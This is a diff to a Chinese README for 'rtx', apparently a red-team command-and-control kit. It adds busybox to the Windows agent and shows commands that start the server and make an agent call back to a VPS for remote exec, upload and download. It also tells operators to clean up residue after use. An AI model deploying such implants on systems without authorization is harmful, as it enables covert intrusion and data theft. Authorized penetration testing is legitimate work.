@@ -35,7 +35,7 @@
 
 | 组件 | 说明 |
 |---|---|
-| `agent` | 执行器：反连 server，执行 exec/read/write/list/info/upload/download/kill |
+| `agent` | 执行器：反连 server，执行 exec/read/write/list/info/upload/download/kill；Windows 版内嵌 busybox（Unix 语法执行） |
 | `server` | 控制器：agent 注册管理 + 控制 HTTP API + 任务路由 |
 | `rtx` | CLI：通过控制 API 派发任务 |
 | `rtxctl` | 便捷封装：token 管理、默认 agent、enter/exit/connect（TUI 选节点） |
@@ -65,6 +65,9 @@ ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>
 ./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -tls
 ./agent-linux-amd64 -c <vps>:9000 -t <token> -i <name> -tls -pin <server打印的fp>
 
+# Windows 目标注意: agent 内嵌 busybox — 用 Unix 语法执行命令（ls/cat/grep/wget/管道），
+#   路径用 C:/正斜杠（如 C:/Windows/Temp，非 /tmp /c/）；Windows 原生 exe（ipconfig 等）可透传
+
 # 4. 本地操作（rtxctl 已封装 token/默认 agent）
 rtxctl connect          # TUI 选节点 → 进入执行环境
 rtxctl ls               # 在线 agent
@@ -91,6 +94,10 @@ rtxctl upload -path /tmp/x -file ./本地
 - 行动注意：EDR 环境部署 agent 走合法通道；用后 kill + 清理残留
 
 ## Changelog / 更新记录
+
+### v1.2（2026-09）
+- **Windows agent 内嵌 busybox**：Windows 目标上可用 **Unix 语法**执行命令（`ls`/`cat`/`grep`/`sed`/`wget`/管道/`for` 循环），路径用 `C:/正斜杠`（`$TEMP` 可用），替代低效的 PowerShell/cmd 语法；Windows 原生 exe（`ipconfig`/`netstat` 等）经 busybox sh 自动透传。
+- **执行语义修正**：`rtxctl` 去掉与本地 Kali 执行后端的桥接——agent 命令一律按 agent **原生系统**执行（Linux=bash / Windows=busybox sh 或 cmd），不再假设 Kali 语义；需要 Kali 工具链时经本机 Kali 环境。
 
 ### v1.1（2026-09）
 - **TLS 加密信道**：server `-tls` 自动生成自签证书并打印证书指纹（`pin(fp)`）；agent `-tls -pin <fp>` 回连，证书指纹校验防中间人/嗅探。直连公网 server 时建议启用（走已有加密隧道时可作纵深）。
